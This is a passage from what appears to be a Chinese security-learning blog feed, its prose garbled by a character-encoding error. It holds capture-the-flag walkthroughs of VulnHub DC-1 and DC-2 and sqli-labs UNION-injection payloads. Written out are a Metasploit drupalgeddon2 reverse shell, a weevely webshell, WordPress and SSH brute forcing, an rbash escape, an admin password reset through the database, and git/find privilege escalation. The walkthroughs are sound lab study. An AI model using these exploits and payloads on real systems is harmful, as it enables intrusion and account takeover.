<p>ä¸‹è½½è¶…æ—¶ï¼Œå°è¯•åœ¨kaliå…ˆä¸‹è½½åœ¨è®©é¶æœºåœ¨kialiä¸Šä¸‹è½½,æœ€è¿‘VMè™šæ‹Ÿæœºä»£ç†ä¸ç®¡ç”¨äº†è¿˜åœ¨æ’æŸ¥â€¦</p>
<br>

<br>

<br>

<br>

<br>

<br>

<p>æ€»ç»“</p>
<ul>
<li><p>nampæ‰«ç½‘æ®µå’Œé¶æœºå¼€æ”¾ç«¯å£</p>
</li>
<li><p>dirsearchæ‰«æç›®å½•</p>
</li>
<li><p>ä¿¡æ¯æœé›†(Joomal)</p>
</li>
<li><p>Joomscanæ‰«æç‰ˆæœ¬</p>
</li>
<li><p>searchsploit æŸ¥æ‰¾joomalæ¼æ´</p>
</li>
<li><p>sqlmapè·‘åå°è´¦å·å¯†ç (å¯†ç è¢«hash)</p>
</li>
<li><p>johnç ´è§£hashå¯†ç </p>
</li>
<li><p>ç™»å½•åå°ï¼Œæ‰¾ä¸Šä¼ shellçš„åœ°æ–¹</p>
</li>
<li><p>ä½¿ç”¨weevelyç”Ÿäº§ä¸€å¥è¯<code>weevely generate &lt;password&gt; b.php</code></p>
</li>
<li><p>ä½¿ç”¨weevelyè¿æ¥<code>weevely &lt;URL&gt; &lt;password&gt;</code></p>
</li>
</ul>
<p><em>weevelyä½¿ç”¨(webshell) <code>https://blog.csdn.net/qq_26090065/article/details/81235120</code></em></p>
<ul>
<li>ææƒ(æœªå®Œæˆ)</li>
</ul>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>è®¾å¤‡ç£ç›˜/CD-ROMé…ç½®ä¸æ­£ç¡®</title>
    <url>/posts/f1a8aa3a/</url>
    <content><![CDATA[<p>IDE è®¾å¤‡ (ç£ç›˜/CD-ROM)é…ç½®ä¸æ­£ç¡®ã€‚â€œide0:1â€ä¸Šå…·æœ‰ä¸€ä¸ª IDE ä»è®¾å¤‡ï¼Œä½†æ²¡æœ‰ä¸»è®¾å¤‡ã€‚æ­¤é…ç½®åœ¨è™šæ‹Ÿæœºä¸­æ— æ³•æ­£å¸¸è¿è¡Œã€‚è¯·ä½¿ç”¨é…ç½®ç¼–è¾‘å™¨å°†ç£ç›˜/CD-ROM ä»â€œide0:1â€ç§»åˆ°â€œide0:0â€ã€‚<br>è§£å†³æ–¹æ¡ˆ:<br>è™šæ‹Ÿæœºè®¾ç½®-&gt;CD/DVD(IDE)-&gt;é«˜çº§-&gt;IDE-&gt;è®¾ç½®ä¸ºâ€™IDE 0:0  CD/DVD(IDE)â€™</p>
]]></content>
      <categories>
        <category>VM</category>
      </categories>
      <tags>
        <tag>VM</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges2</title>
    <url>/posts/e4e28081/</url>
    <content><![CDATA[<p>é¶æœºDC-2ä¸‹è½½åœ°å€ï¼š<a href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a></p>
<br>

<p>ç¯å¢ƒ</p>
<blockquote>
<p>ç½‘æ®µ 192.168.18.0/24</p>
<p>kali 192.168.18.131</p>
<p>é¶æœº 192.168.18.132</p>
</blockquote>
<p>æ‰«æç½‘æ®µ</p>
<blockquote>
<p>sudo nmap -sn 192.168.18.0/24</p>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-30 10:12 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00013s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.132<br>Host is up (0.00055s latency).<br>MAC Address: 00:0C:29:4B:26:E6 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00017s latency).<br>MAC Address: 00:50:56:E1:37:77 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.24 seconds<br>kali@kali2020:~$ </p>
</blockquote>
<p>æ‰«æé¶æœºå¼€æ”¾çš„ç«¯å£</p>
<blockquote>
<p>sudo nmap 192.168.18.132 -p- -sV<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-30 11:38 CST<br>Nmap scan report for dc-2 (192.168.18.132)<br>Host is up (0.0013s latency).<br>Not shown: 65533 closed ports<br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    Apache httpd 2.4.10 ((Debian))<br>7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)<br>MAC Address: 00:0C:29:4B:26:E6 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
</blockquote>
<p>å¼€æ”¾äº†80ç«¯å£å’Œsshç«¯å£ï¼Œæµè§ˆå™¨å»è®¿é—®å‘ç°æ— æ³•è®¿é—®ï¼Œç›´æ¥è·³è½¬æˆäº†dc2ï¼Œå»ä¿®æ”¹hosts</p>
<blockquote>
<p>sudo vim /etc/hosts</p>
<p>æ·»åŠ  192.168.18.132 dc-2</p>
</blockquote>
<p>å†å»è®¿é—®192.168.18.132å³å¯,å‘ç°æ˜¯wordpress</p>
<h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><p>ç‚¹å‡»flag å¾—åˆ°flag1ï¼Œæç¤ºä½¿ç”¨<code>cewl</code></p>
<p><img src="/posts/e4e28081/flag1.png"></p>
<p>ç”¨<code>dirb</code>æ‰«ä¸€ä¸‹ç›®å½•</p>
<p>æ‰«åˆ°ä¸€ä¸ªwp-admin å»è®¿é—®åä¼šè·³è½¬åˆ°ç™»å½•é¡µé¢ <a href="http://dc-2/wp-login.php">http://dc-2/wp-login.php</a></p>
<p>è¿™é‡Œä¹Ÿå¯ä»¥ç”¨<code>nikto</code></p>
<p><img src="/posts/e4e28081/nikto1.png"></p>
<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><p>ä½¿ç”¨kaliè‡ªå¸¦çš„wpscanæ‰«ä¸€ä¸‹<br><code>wpscan --url dc-2 -e u</code></p>
<p><img src="/posts/e4e28081/wpscan1.png"></p>
<br>

<p>æ‰«åˆ°ä¸‰ä¸ªç”¨æˆ·åï¼Œadmin,jerry,tom<br>åˆ›å»ºä¸€ä¸ªlistå­˜æ”¾è¿™ä¸‰ä¸ªç”¨æˆ·å</p>
<br>

<p>æ ¹æ®flag1çš„æç¤º ä½¿ç”¨<code>cewl</code>ç”Ÿæˆå¯†ç å­—å…¸</p>
<br>

<blockquote>
<p>kali@kali2020:~/Desktop$ cewl dc-2 -w dc-2.dic<br>CeWL 5.4.8 (Inclusion) Robin Wood (<a href="mailto:&#x72;&#111;&#98;&#x69;&#110;&#64;&#x64;&#105;&#x67;&#x69;&#x2e;&#110;&#x69;&#x6e;&#106;&#97;">&#x72;&#111;&#98;&#x69;&#110;&#64;&#x64;&#105;&#x67;&#x69;&#x2e;&#110;&#x69;&#x6e;&#106;&#97;</a>) (<a href="https://digi.ninja/">https://digi.ninja/</a>)</p>
<p>kali@kali2020:~/Desktop$ cat dc-2.dic </p>
</blockquote>
<p>ä½¿ç”¨wpscançˆ†ç ´</p>
<blockquote>
<p>kali@kali2020:~/Desktop$ wpscan â€“url dc-2 -U dc-2users.list  -P dc-2.dic </p>
<p>[!] Valid Combinations Found:<br> | Username: jerry, Password: adipiscing<br> | Username: tom, Password: parturient</p>
</blockquote>
<p><img src="/posts/e4e28081/wpscan2.png"></p>
<p>ä½¿ç”¨tom æˆåŠŸç™»å½•ï¼Œå‘ç°æœ‰ç¯‡åä¸ºhello-wordçš„æ–‡ç« è¿›å»çœ‹çœ‹</p>
<p>æœ‰ä¸€ä¸ªæœç´¢åŠŸèƒ½ï¼Œå°è¯•ä¸€ä¸‹ï¼Œå‘ç°è¾“å…¥1ä¼šå‡ºç°flag1,è¾“å…¥2å‡ºç°flag2<br><img src="/posts/e4e28081/flag2.png"><br><img src="/posts/e4e28081/flag12.png"><br>flag2æç¤ºæ¢ä¸€æ¡è·¯ï¼Œä¹Ÿæ˜¯å°±è¯´è®©æˆ‘ä»¬å»å°è¯•sshç«¯å£</p>
<p>ä½¿ç”¨hydraçˆ†ç ´ssh</p>
<blockquote>
<p>kali@kali2020:~/Desktop$ hydra -L dc-2users.list  -P dc-2.dic  192.168.18.132 ssh -s 7744</p>
<p> å¾—åˆ°è´¦å·å¯†ç </p>
<p>[7744][ssh] host: 192.168.18.132   login: tom   password: parturient</p>
</blockquote>
<h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>ä½¿ç”¨sshç™»å½•<br><code>kali@kali2020:~/Desktop$ ssh tom@192.168.18.132 -p 7744</code><br>ç™»å½•å<code>ls</code>åå‘ç°å­˜åœ¨flag3.txt</p>
<p>ä½¿ç”¨<code>cat flag3.txt</code></p>
<blockquote>
<p>-rbash: sudo: command not found</p>
</blockquote>
<p><img src="/posts/e4e28081/rbashnotfound.png"></p>
<p><strong>-rbashç»•è¿‡</strong><br>è§£å†³æ–¹æ¡ˆ <a href="https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html">https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a </span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure>
<p><img src="/posts/e4e28081/flag3.png"></p>
<p>å¾—åˆ°flag3</p>
<h4 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h4><p>æ ¹æ®flag3æç¤ºï¼Œä½¿ç”¨<code>su</code>åˆ‡æ¢åˆ°jerryç”¨æˆ·ä¸‹<br><code>cat /etc/passwd </code>å‘ç°Jerryç”¨æˆ·<br>è¾“å…¥ä¹‹å‰çˆ†ç ´å‡ºæ¥çš„å¯†ç æˆåŠŸç™»å½•Jerryç”¨æˆ·</p>
<blockquote>
<p>cd ~<br>ls<br>cat flag4.txt<br>Good to see that youâ€™ve made it this far - but youâ€™re not home yet.<br>You still need to get the final flag (the only flag that really counts!!!).<br>No hints here - youâ€™re on your own now.  :-)<br>Go on - git outta here!!!!<br><br><br><br></p>
</blockquote>
<h4 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h4><p>æŸ¥çœ‹sudo æ”¯æŒçš„å…å¯†å‘½ä»¤</p>
<blockquote>
<p>sudo -l</p>
<p>Matching Defaults entries for jerry on DC-2:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
<p>User jerry may run the following commands on DC-2:<br>    (root) NOPASSWD: /usr/bin/git</p>
</blockquote>
<p>æ ¹æ®ä¸Šä¸€ä¸ªæç¤º è¿™é‡Œçš„gitå‘½ä»¤æ¨æµ‹å¯ä»¥ä½¿ç”¨</p>
<p>è€ƒè™‘gitææƒ <a href="https://gtfobins.github.io/gtfobins/git/">https://gtfobins.github.io/gtfobins/git/</a></p>
<blockquote>
<p>sudo git -p â€“help</p>
</blockquote>
<p><img src="/posts/e4e28081/git1.png"><br><img src="/posts/e4e28081/git2.png"><br><img src="/posts/e4e28081/git3.png"><br><img src="/posts/e4e28081/finalflag.png"></p>
<p><strong>æ€»ç»“</strong></p>
<ul>
<li> rbashç»•è¿‡</li>
<li> gitææƒ</li>
</ul>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>DCchallenges1</title>
    <url>/posts/7debd13b/</url>
    <content><![CDATA[<p>å®‰è£…</p>
<p>ä¸‹è½½è§£å‹åä½¿ç”¨Vmwareæ‰“å¼€ovaæ–‡ä»¶ï¼Œé€‰æ‹©æ¡¥æ¥æ¨¡å¼ï¼ŒåŒæ—¶ä¹Ÿå°†kaliè®¾ç½®ä¸ºæ¡¥æ¥æ¨¡å¼</p>
<br>

<p>ç¯å¢ƒ</p>
<blockquote>
<p>ç½‘æ®µ 192.168.18.0/24</p>
<p>kali 192.168.18.131</p>
<p>é¶æœº 192.168.18.130</p>
</blockquote>
<br>

<p>æ‰«æç½‘æ®µ</p>
<blockquote>
<p><strong>sudo nmap -sn 192.168.18.0/24</strong></p>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-27 21:30 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00015s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.130<br>Host is up (0.00018s latency).<br>MAC Address: 00:0C:29:F4:40:B8 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00036s latency).<br>MAC Address: 00:50:56:F1:CD:81 (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 2.16 seconds</p>
</blockquote>
<br>

<p>æ‰«æé¶æœºå¼€æ”¾çš„ç«¯å£</p>
<blockquote>
<p><strong>sudo nmap -sS 192.168.18.130</strong></p>
<p>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-04-27 21:31 CST<br>Nmap scan report for 192.168.18.130<br>Host is up (0.000079s latency).<br>Not shown: 997 closed ports<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>111/tcp open  rpcbind<br>MAC Address: 00:0C:29:F4:40:B8 (VMware)</p>
<p>Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds</p>
<p>æ³¨ï¼šsS ï¼šåŠå¼€æ”¾æ‰«æï¼ˆé3æ¬¡æ¡æ‰‹çš„tcpæ‰«æï¼‰æ¯”è¾ƒå®‰å…¨ï¼Œä¸ä¼šäº§ç”Ÿä¼šè¯ï¼Œå‡ ä¹ä¸ä¼šäº§ç”Ÿæ—¥å¿—ï¼Œå·¥ä½œä¸­å¸¸ç”¨ï¼Œå»ºè®®å¤§å®¶ä¸è¦ç›´æ¥å…¨ä¸Šçš„å»æ‰«ï¼Œç¨³å¦¥æ›´ç¨³å¦¥ï¼Œéœ€è¦æœ‰rootæƒé™</p>
</blockquote>
<p>å‘ç°å¼€æ”¾äº†80ç«¯å£ï¼Œå°±ç”¨æµè§ˆå™¨å»è®¿é—®ä¸€ä¸‹<code>192.168.18.130:80</code> æ ¹æ®ç½‘ç«™é¡µé¢æ˜¾ç¤ºä¿¡æ¯å¯ä»¥åˆ¤æ–­æ˜¯Drupalçš„CMS</p>
<p>ç”¨dirsearchæ‰«ä¸€ä¸‹çœ‹çœ‹æœ‰ä»€ä¹ˆ</p>
<blockquote>
<p><strong>python3 dirsearch.py -u 192.168.18.130:80</strong></p>
</blockquote>
<p>ç”¨dirb æ‰«ä¸€ä¸‹è¯•è¯•</p>
<blockquote>
<p><strong>dirb <a href="http://192.168.18.130/">http://192.168.18.130</a></strong></p>
</blockquote>
<p>æ²¡æ‰¾åˆ°å•¥æœ‰ç”¨çš„ä¿¡æ¯ï¼Œçœ‹ä¸‹robots.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Crawl-delay: 10</span><br><span class="line"># Directories</span><br><span class="line">Disallow: /includes/</span><br><span class="line">Disallow: /misc/</span><br><span class="line">Disallow: /modules/</span><br><span class="line">Disallow: /profiles/</span><br><span class="line">Disallow: /scripts/</span><br><span class="line">Disallow: /themes/</span><br><span class="line"># Files</span><br><span class="line">Disallow: /CHANGELOG.txt</span><br><span class="line">Disallow: /cron.php</span><br><span class="line">Disallow: /INSTALL.mysql.txt</span><br><span class="line">Disallow: /INSTALL.pgsql.txt</span><br><span class="line">Disallow: /INSTALL.sqlite.txt</span><br><span class="line">Disallow: /install.php</span><br><span class="line">Disallow: /INSTALL.txt</span><br><span class="line">Disallow: /LICENSE.txt</span><br><span class="line">Disallow: /MAINTAINERS.txt</span><br><span class="line">Disallow: /update.php</span><br><span class="line">Disallow: /UPGRADE.txt</span><br><span class="line">Disallow: /xmlrpc.php</span><br><span class="line"># Paths (clean URLs)</span><br><span class="line">Disallow: /admin/</span><br><span class="line">Disallow: /comment/reply/</span><br><span class="line">Disallow: /filter/tips/</span><br><span class="line">Disallow: /node/add/</span><br><span class="line">Disallow: /search/</span><br><span class="line">Disallow: /user/register/</span><br><span class="line">Disallow: /user/password/</span><br><span class="line">Disallow: /user/login/</span><br><span class="line">Disallow: /user/logout/</span><br><span class="line"># Paths (no clean URLs)</span><br><span class="line">Disallow: /?q=admin/</span><br><span class="line">Disallow: /?q=comment/reply/</span><br><span class="line">Disallow: /?q=filter/tips/</span><br><span class="line">Disallow: /?q=node/add/</span><br><span class="line">Disallow: /?q=search/</span><br><span class="line">Disallow: /?q=user/password/</span><br><span class="line">Disallow: /?q=user/register/</span><br><span class="line">Disallow: /?q=user/login/</span><br><span class="line">Disallow: /?q=user/logout/</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ²¡ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯</p>
<br>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">msf6 &gt; search drupal</span><br><span class="line">msf6 &gt; use exploit/unix/webapp/drupal_drupalgeddon2 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options </span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhosts 192.168.18.130</span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; show options </span><br><span class="line">msf6 exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit </span><br><span class="line">[*] Started reverse TCP handler on 192.168.18.131:4444 </span><br><span class="line">[*] Executing automatic check (disable AutoCheck to override)</span><br><span class="line">[!] The service is running, but could not be validated.</span><br><span class="line">[*] Sending stage (39282 bytes) to 192.168.18.130</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.18.131:4444 -&gt; 192.168.18.130:43581) at 2021-04-28 20:26:27 +0800</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: www-data (33)</span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">/var/www</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /var/www</span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 4653 created.</span><br><span class="line">Channel 3 created.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/www</span><br><span class="line">cat falg1.txt</span><br><span class="line">Every good CMS needs a config file - and so do you.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">cat /etc/passwd</span><br><span class="line">å‘ç°ä¸‹é¢æœ‰ä¸ªfalg4  flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</span><br><span class="line">cd /home/flag4</span><br><span class="line">ls</span><br><span class="line">flag4.txt</span><br><span class="line">cat flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag in root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it&#x27;s not that easy.  Or maybe it is?</span><br></pre></td></tr></table></figure>

<br>

<h4 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æŸ¥çœ‹ç½‘ç«™é…ç½® çœ‹æœ‰ä»€ä¹ˆæœ‰ç”¨ä¿¡æ¯</span><br><span class="line">cd /var/www/site/default</span><br><span class="line">ls</span><br><span class="line">default.settings.php</span><br><span class="line">files</span><br><span class="line">settings.php</span><br><span class="line"></span><br><span class="line">cat settings.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#x27;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"> </span><br><span class="line">$databases = array (</span><br><span class="line">  &#x27;default&#x27; =&gt; </span><br><span class="line">  array (</span><br><span class="line">    &#x27;default&#x27; =&gt; </span><br><span class="line">    array (</span><br><span class="line">      &#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,</span><br><span class="line">      &#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,</span><br><span class="line">      &#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;,</span><br><span class="line">      &#x27;host&#x27; =&gt; &#x27;localhost&#x27;,</span><br><span class="line">      &#x27;port&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">      &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,</span><br><span class="line">      &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<p>ç”¨pythonåå¼¹ä¸ªäº¤äº’å¼shell<br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
<br>

<br>

<h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>é¡ºä¾¿å¾—åˆ°äº†æ•°æ®åº“ä¿¡æ¯ï¼Œç™»å½•æ•°æ®åº“çœ‹çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www/sites/default$ mysql -u dbuser -p</span><br><span class="line">mysql -u dbuser -p</span><br><span class="line">Enter password: R0ck3t</span><br><span class="line"></span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 418639</span><br><span class="line">Server version: 5.5.60-0+deb7u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use drupaldb</span><br><span class="line">use drupaldb</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables from drupaldb;</span><br><span class="line">  ... ...</span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">| uid | name  | pass                                                    | mail              | theme | signature | signature_format | created    | access     | login      | status | timezone            | language | picture | init              | data |</span><br><span class="line">+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+</span><br><span class="line">|   0 |       |                                                         |                   |       |           | NULL             |          0 |          0 |          0 |      0 | NULL                |          |       0 |                   | NULL |</span><br><span class="line">|   1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR | admin@example.com |       |           | NULL             | 1550581826 | 1550583852 | 1550582362 |      1 | Australia/Melbourne |          |       0 | admin@example.com | b:0; |</span><br><span class="line">|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg | fred@example.org  |       |           | filtered_html    | 1550581952 | 1550582225 | 1550582225 |      1 | Australia/Melbourne |          |       0 | fred@example.org  | b:0; |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">drupalå¯†ç çš„åŠ å¯†æ˜¯ç ´è§£ä¸å‡ºæ¥ï¼Œéœ€è¦é‡ç½®ç®¡ç†çš„å¯†ç (åŠ å¯†è„šæœ¬ä½ç½®åœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹çš„scripts/password-hash.sh)</span><br><span class="line">php scripts/password-hash.sh admin  (adminæ˜¯ä½ è¦è®¾ç½®çš„æ–°å¯†ç )</span><br><span class="line"></span><br><span class="line">www-data@DC-1:/var/www$ php scripts/password-hash.sh admin</span><br><span class="line">php scripts/password-hash.sh admin</span><br><span class="line"></span><br><span class="line">password: admin                 hash: $S$DiOAa4l0lQWNrQKTEfwN1erRW769BkBafRIkfVBFRS79BIWF.Vtb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">å»æ•°æ®åº“ä¿®æ”¹å¯†ç </span><br><span class="line">mysql&gt; update users set pass =&quot;$S$DiOAa4l0lQWNrQKTEfwN1erRW769BkBafRIkfVBFRS79BIWF.Vtb&quot; where name=&quot;admin&quot;;</span><br><span class="line">&lt;N1erRW769BkBafRIkfVBFRS79BIWF.Vtb&quot; where name=&quot;admin&quot;;                      </span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">é‡ç½®å®Œå¯†ç åç™»å½•ç½‘ç«™ (admin admin)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/7debd13b/DCchallenges1.png"></p>
<br>

<br>

<br>

<p>ä½†æ˜¯å‘ç°å½“å‰æƒé™ä¸å¤Ÿ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami </span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<h4 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h4><p>ä½¿ç”¨<code>find</code>ææƒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www$ touch dctest        </span><br><span class="line">touch dctest</span><br><span class="line">www-data@DC-1:/var/www$ find dctest -exec whoami \;</span><br><span class="line">find dctest -exec whoami \;</span><br><span class="line">root</span><br><span class="line">www-data@DC-1:/var/www$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@DC-1:/var/www$ find dctest -exec ls /root \;</span><br><span class="line">find dctest -exec ls /root \;</span><br><span class="line">thefinalflag.txt</span><br><span class="line">www-data@DC-1:/var/www$ find dctest -exec cat /root/thefinalflag.txt \;</span><br><span class="line">find dctest -exec cat /root/thefinalflag.txt \;</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you&#x27;ve enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br><span class="line">www-data@DC-1:/var/www$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote>
<p><a href="https://www.freebuf.com/articles/web/260236.html">https://www.freebuf.com/articles/web/260236.html</a></p>
<p><a href="https://blog.csdn.net/wang_624/article/details/90509951">https://blog.csdn.net/wang_624/article/details/90509951</a></p>
<p><a href="https://f5.pm/go-53516.html">https://f5.pm/go-53516.html</a></p>
<p><a href="https://www.freebuf.com/articles/network/218073.html">https://www.freebuf.com/articles/network/218073.html</a></p>
<p><a href="https://blog.mzfr.me/vulnhub-writeups/2019-07-12-DC1">https://blog.mzfr.me/vulnhub-writeups/2019-07-12-DC1</a></p>
</blockquote>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labsæ€»ç»“</title>
    <url>/posts/6db7f8ba/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs5</title>
    <url>/posts/fdded023/</url>
    <content><![CDATA[<h3 id="54"><a href="#54" class="headerlink" title="54"></a>54</h3><br>

<p><code>id=0&#39; and 1=1 union select 1,2,3 --+</code></p>
<br>

<p><code>id=0&#39; and 1=1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),3 --+</code></p>
<p>dbs challenges</p>
<p>table qpu4f7zhcb</p>
<p>columns  sessid,secret_6KIK,tryy</p>
<br>

<p><code>id=0&#39; and 1=1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;qpu4f7zhcb&#39;),3 --+</code></p>
<br>

<p>id=0â€™ and 1=1 union select 1,(select sessid from qpu4f7zhcb limit 0,1),(select secret_6KIK from qpu4f7zhcb limit 0,1)  â€“+</p>
<br>

<br>

<h3 id="55"><a href="#55" class="headerlink" title="55"></a>55</h3><p><code>)</code>é—­åˆ </p>
